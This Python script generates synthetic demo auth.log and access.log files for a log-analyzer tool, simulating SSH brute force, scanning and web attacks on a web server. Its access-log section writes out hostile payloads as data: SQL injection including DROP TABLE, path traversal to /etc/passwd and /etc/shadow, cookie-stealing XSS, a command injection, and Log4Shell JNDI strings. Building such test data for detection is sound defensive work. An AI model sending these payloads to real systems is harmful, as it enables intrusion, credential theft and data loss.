"""Generate the demo logs in samples/ (deterministic, so the output is stable).

Scenario on 21 Oct 2026 for a small Ubuntu web server:
  auth.log
    - normal admin logins and sudo use by alice and bob
    - 203.0.113.45 brute forces SSH at 03:12, gets in as "admin" and opens a root shell
    - 198.51.100.23 slowly tries common service usernames (enumeration)
    - bob fumbles his sudo password three times
    - alice logs in late at night
  access.log
    - ordinary browser traffic
    - 192.0.2.77 runs Nikto: dozens of 404s, and finds an exposed /.env
    - 203.0.113.99 runs sqlmap plus manual path traversal / XSS payloads
    - 198.51.100.200 brute forces /wp-login.php and finally gets a redirect
    - 192.0.2.150 sends a Log4Shell probe in the User-Agent
    - an internal health check with curl

Usage:  python tools/generate_samples.py   (from the log-analyzer folder)
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote

OUT = Path(__file__).resolve().parent.parent / "samples"
DAY = datetime(2026, 10, 21)
HOST = "web01"
rng = random.Random(42)


def at(h: int, m: int, s: int = 0) -> datetime:
    return DAY.replace(hour=h, minute=m, second=s)


# ---------------------------------------------------------------------------
# auth.log
# ---------------------------------------------------------------------------


def syslog(ts: datetime, prog: str, msg: str) -> tuple[datetime, str]:
    pid = rng.randint(1000, 65000)
    tag = prog if prog == "sudo" else f"{prog}[{pid}]"
    return ts, f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} {HOST} {tag}: {msg}"


def auth_lines() -> list[str]:
    out: list[tuple[datetime, str]] = []

    def login(ts, user, ip, method="publickey"):
        port = rng.randint(40000, 65000)
        out.append(syslog(ts, "sshd", f"Accepted {method} for {user} from {ip} port {port} ssh2"))
        out.append(syslog(ts, "sshd", f"pam_unix(sshd:session): session opened for user {user}(uid=1000) by (uid=0)"))

    def sudo(ts, user, cmd):
        out.append(syslog(ts, "sudo", f"  {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"))

    # cron noise every 15 minutes
    t = at(0, 0)
    while t.day == DAY.day:
        out.append(syslog(t, "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)"))
        t += timedelta(minutes=15)

    # normal admin work
    login(at(9, 2, 11), "alice", "10.0.0.12")
    sudo(at(9, 4, 30), "alice", "/usr/bin/apt update")
    sudo(at(9, 6, 2), "alice", "/usr/bin/apt upgrade -y")
    login(at(10, 15, 40), "bob", "10.0.0.15", "password")
    sudo(at(10, 20, 5), "bob", "/usr/bin/systemctl restart nginx")
    login(at(13, 31, 9), "alice", "10.0.0.12")
    sudo(at(13, 35, 44), "alice", "/usr/bin/tail -n 200 /var/log/nginx/error.log")

    # bob forgets his password
    for s in (5, 19, 31):
        out.append(syslog(at(14, 2, s), "sudo",
                          "pam_unix(sudo:auth): authentication failure; logname=bob uid=1001 euid=0 tty=/dev/pts/1 ruser=bob rhost=  user=bob"))
    out.append(syslog(at(14, 2, 31), "sudo",
                      "  bob : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/vim /etc/hosts"))
    for s in (40, 52):
        out.append(syslog(at(14, 3, s), "sudo",
                          "  bob : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/vim /etc/hosts"))
    sudo(at(14, 4, 20), "bob", "/usr/bin/vim /etc/hosts")

    # late-night login by alice (legit, but outside working hours)
    login(at(23, 41, 3), "alice", "10.0.0.12")

    # SSH brute force from 203.0.113.45 that succeeds
    attacker = "203.0.113.45"
    t = at(3, 12, 4)
    targets = ["root"] * 18 + ["admin"] * 14 + ["ubuntu"] * 6
    for user in targets:
        port = rng.randint(30000, 60000)
        if user == "ubuntu":
            out.append(syslog(t, "sshd", f"Invalid user {user} from {attacker} port {port}"))
            out.append(syslog(t, "sshd", f"Failed password for invalid user {user} from {attacker} port {port} ssh2"))
        else:
            out.append(syslog(t, "sshd", f"Failed password for {user} from {attacker} port {port} ssh2"))
        t += timedelta(seconds=rng.randint(4, 15))
    out.append(syslog(t, "sshd",
                      f"message repeated 3 times: [ Failed password for admin from {attacker} port {rng.randint(30000, 60000)} ssh2]"))
    t += timedelta(seconds=40)
    login(t, "admin", attacker, "password")
    sudo(t + timedelta(minutes=2), "admin", "/bin/bash")
    sudo(t + timedelta(minutes=3), "admin", "/usr/bin/crontab -l")

    # slow username enumeration from 198.51.100.23, spread over the day
    enum_ip = "198.51.100.23"
    for i, user in enumerate(["test", "oracle", "postgres", "git", "ftpuser", "deploy", "jenkins", "minecraft"]):
        ts = at(1 + i * 2, rng.randint(0, 59), rng.randint(0, 59))
        port = rng.randint(30000, 60000)
        out.append(syslog(ts, "sshd", f"Invalid user {user} from {enum_ip} port {port}"))
        out.append(syslog(ts, "sshd", f"Connection closed by invalid user {user} {enum_ip} port {port} [preauth]"))

    out.sort(key=lambda x: x[0])
    return [line for _, line in out]


# ---------------------------------------------------------------------------
# access.log
# ---------------------------------------------------------------------------

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
]
PAGES = ["/", "/about", "/blog", "/blog/hardening-ssh", "/blog/nginx-tls", "/contact", "/products.php?id=3",
         "/products.php?id=7", "/static/css/site.css", "/static/js/app.js", "/static/img/logo.png"]


def access(ts: datetime, ip: str, method: str, path: str, status: int, ua: str, size: int | None = None,
           referer: str = "-") -> tuple[datetime, str]:
    size = size if size is not None else (rng.randint(300, 40000) if status == 200 else rng.randint(150, 600))
    ua = ua.replace('"', '\\"')
    return ts, (f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "{method} {path} HTTP/1.1" '
                f'{status} {size} "{referer}" "{ua}"')


def access_lines() -> list[str]:
    out: list[tuple[datetime, str]] = []

    # normal visitors
    visitors = [f"198.18.{rng.randint(0, 255)}.{rng.randint(1, 254)}" for _ in range(25)]
    for _ in range(320):
        ip = rng.choice(visitors)
        ts = at(rng.randint(7, 22), rng.randint(0, 59), rng.randint(0, 59))
        page = rng.choice(PAGES)
        status = 304 if page.startswith("/static") and rng.random() < 0.3 else 200
        out.append(access(ts, ip, "GET", page, status, rng.choice(BROWSERS), referer="https://example.org/"))
    for ip in visitors[:6]:
        out.append(access(at(rng.randint(8, 20), rng.randint(0, 59)), ip, "GET", "/favicon.ico", 404,
                          rng.choice(BROWSERS)))

    # internal uptime check
    t = at(0, 0)
    while t.day == DAY.day:
        out.append(access(t, "10.0.0.5", "GET", "/healthz", 200, "curl/8.5.0", 2))
        t += timedelta(minutes=30)

    # Nikto scan from 192.0.2.77
    nikto = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)"
    probes = ["/admin/", "/backup/", "/old/", "/test.php", "/phpinfo.php", "/info.php", "/server-status", "/.git/config",
              "/.svn/entries", "/.htpasswd", "/config.php.bak", "/db.sql", "/backup.sql", "/wp-config.php", "/.aws/credentials",
              "/cgi-bin/test-cgi", "/cgi-bin/php", "/console", "/manager/html", "/jmx-console/", "/phpmyadmin/",
              "/pma/", "/myadmin/", "/admin.php", "/login.jsp", "/web.config", "/crossdomain.xml", "/install.php",
              "/setup.php", "/README.md", "/CHANGELOG.txt", "/sitemap.xml.gz", "/.DS_Store", "/actuator/env",
              "/debug/pprof/", "/api/swagger.json", "/.well-known/security.txt", "/uploads/", "/tmp/", "/logs/"]
    t = at(11, 47, 2)
    for path in probes:
        out.append(access(t, "192.0.2.77", "GET", path, 404, nikto))
        t += timedelta(seconds=rng.randint(1, 4))
    out.append(access(t, "192.0.2.77", "GET", "/.env", 200, nikto, 412))

    # sqlmap + manual payloads from 203.0.113.99
    sqlmap = "sqlmap/1.8.9#stable (https://sqlmap.org)"
    t = at(15, 20, 10)
    for payload in ["3'", "3' AND '1'='1", "3' OR '1'='1' -- -", "3 AND SLEEP(5)", "3 UNION ALL SELECT NULL,NULL,NULL-- -",
                    "3 UNION ALL SELECT table_name,NULL,NULL FROM information_schema.tables-- -",
                    "3; DROP TABLE users", "3 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)"]:
        status = 500 if "'" in payload and "--" not in payload else 200
        out.append(access(t, "203.0.113.99", "GET", "/products.php?id=" + quote(payload), status, sqlmap))
        t += timedelta(seconds=rng.randint(1, 6))
    firefox = BROWSERS[2]
    t = at(15, 34, 0)
    for path, status in [("/download.php?file=../../../../etc/passwd", 200),
                         ("/download.php?file=" + quote(quote("../../../etc/shadow")), 403),
                         ("/download.php?file=..%5c..%5cwindows%5cwin.ini", 404),
                         ("/search?q=" + quote("<script>alert(document.cookie)</script>"), 200),
                         ("/search?q=" + quote('"><img src=x onerror=alert(1)>'), 200),
                         ("/ping.php?host=" + quote("127.0.0.1; cat /etc/passwd"), 200)]:
        out.append(access(t, "203.0.113.99", "GET", path, status, firefox))
        t += timedelta(seconds=rng.randint(5, 30))

    # WordPress login brute force from 198.51.100.200
    t = at(19, 5, 0)
    for _ in range(34):
        out.append(access(t, "198.51.100.200", "POST", "/wp-login.php", 200, BROWSERS[0], 4521))
        t += timedelta(seconds=rng.randint(2, 7))
    out.append(access(t, "198.51.100.200", "POST", "/wp-login.php", 302, BROWSERS[0], 0))
    out.append(access(t + timedelta(seconds=1), "198.51.100.200", "GET", "/wp-admin/", 200, BROWSERS[0]))

    # Log4Shell probe in the User-Agent
    out.append(access(at(6, 3, 51), "192.0.2.150", "GET", "/", 200,
                      "${jndi:ldap://192.0.2.150:1389/Basic/Command/Base64/aWQ=}"))
    out.append(access(at(6, 3, 52), "192.0.2.150", "GET", "/?x=${jndi:ldap://192.0.2.150:1389/a}", 200, "-"))

    out.sort(key=lambda x: x[0])
    return [line for _, line in out]


def main() -> None:
    OUT.mkdir(exist_ok=True)
    (OUT / "auth.log").write_text("\n".join(auth_lines()) + "\n", encoding="utf-8", newline="\n")
    (OUT / "access.log").write_text("\n".join(access_lines()) + "\n", encoding="utf-8", newline="\n")
    print(f"wrote {OUT / 'auth.log'} and {OUT / 'access.log'}")


if __name__ == "__main__":
    main()
